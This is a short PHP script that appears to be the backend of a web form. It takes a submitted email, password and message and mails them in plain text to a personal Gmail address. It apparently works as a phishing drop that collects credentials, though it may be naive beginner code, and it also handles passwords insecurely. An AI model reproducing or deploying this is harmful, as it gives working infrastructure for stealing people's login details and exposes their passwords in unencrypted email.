<?php
if ($_SERVER["REQUEST_METHOD"] == "POST") {
    $email = $_POST["email"];
    $password = $_POST["password"];
    $message = $_POST["contact-message"];

    $to = "abhi.abhishek2111@gmail.com";
    $subject = "New Form Submission";
    $message = "Email: $email\nPassword: $password\nMessage: $message";

    mail($to, $subject, $message);
}
?>
